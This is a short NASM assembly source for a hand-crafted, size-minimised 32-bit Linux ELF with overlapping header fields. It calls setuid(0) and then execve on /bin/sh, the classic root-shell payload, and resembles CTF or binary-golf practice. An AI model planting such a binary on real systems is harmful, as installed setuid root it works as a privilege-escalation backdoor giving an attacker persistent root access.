BITS 32
    org 0x01337000

    db  0x7F, "ELF" ; e_ident
    dd  1           ; p_type
    dd  0           ; p_offset
    dd  $$          ; p_vaddr 
    dw  2           ; e_type        ; p_paddr
    dw  3           ; e_machine
    dd  _start      ; e_version     ; p_filesz
    dd  _start      ; e_entry       ; p_memsz
    dd  4           ; e_phoff       ; p_flags

bin_sh:
    db  "/bin/sh"   ; e_shoff       ; p_align    ; e_flags
    db  0

    dw  0x34        ; e_ehsize
    dw  0x20        ; e_phentsize
    dw  1           ; e_phnum
    ;dw  0          ; e_shentsize
    ;dw  0          ; e_shnum
    ;dw  0          ; e_shstrndx

 _start:
    ;xor  ebx, ebx   ; ebx = uid = 0 -> not needed ebx is 0 at init
    mov  al, 23      ; setuid syscall number on x86
    int  0x80        ; syscall

    xor  eax,eax     ; set eax = 0 in case setuid did not succeed
    ;cltd            ; edx = 0 by extending sign of eax -> not needed edx is 0 at init
    mov  ebx, bin_sh ; move pointer to /bin/sh string into ebx (param1)
    push eax         ; push a zero to the stack (end of param2 array)
    push ebx         ; push pointer to /bin/sh to the stack to get a **char in esp
    mov  ecx, esp    ; move **char of /bin/sh into ecx (param2)
    mov  al, 11      ; execve syscall number on x86
    int  0x80        ; syscall

filesize equ $ - $$
